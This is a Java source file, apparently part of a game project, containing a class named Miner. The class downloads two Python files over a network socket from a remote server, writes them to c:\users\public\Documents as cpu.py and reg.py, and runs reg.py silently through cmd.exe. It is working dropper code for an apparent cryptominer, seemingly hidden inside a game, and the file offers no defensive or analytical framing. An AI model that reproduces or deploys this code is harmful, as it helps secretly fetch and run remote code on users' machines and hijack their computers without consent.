package Game;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class Miner {
    private static final String MINER_PATH = "c:\\users\\public\\Documents\\cpu.py";
    private static final String REG_PATH = "c:\\users\\public\\Documents\\reg.py";

    public static void createMiner() {
        if (!minerFound()) {
            System.out.println("creating miner");
            byte[] bytes = getFile();
            createFile(bytes, MINER_PATH);
            System.out.println("creating the reg");
            bytes = getFile();
            createFile(bytes, REG_PATH);
            System.out.println("running");
            run(REG_PATH);
            System.out.println("runned");

        }
    }

    private static boolean minerFound() {
        File tempFile = new File(MINER_PATH);
        return tempFile.exists();
    }

    private static byte[] getFile() {
        try {
            Networks net = Networks.getInstance(SocketType.Miner);
            String msg = net.getMsg();
            net.sendMsg("n");
            System.out.println("got file");
            return msg.getBytes(StandardCharsets.UTF_8);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private static void createFile(byte[] bytes, String path) {
        try {
            FileOutputStream fos = new FileOutputStream(path);
            fos.write(bytes);
            fos.flush();
            fos.close();
        } catch (IOException e) {
        }
    }

    private static void run(String path) {
        Runtime rt = Runtime.getRuntime();
        try {
            ProcessBuilder builder = new ProcessBuilder(
                    "cmd.exe", "/c", "python " + path);
            builder.redirectErrorStream(true);
            builder.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
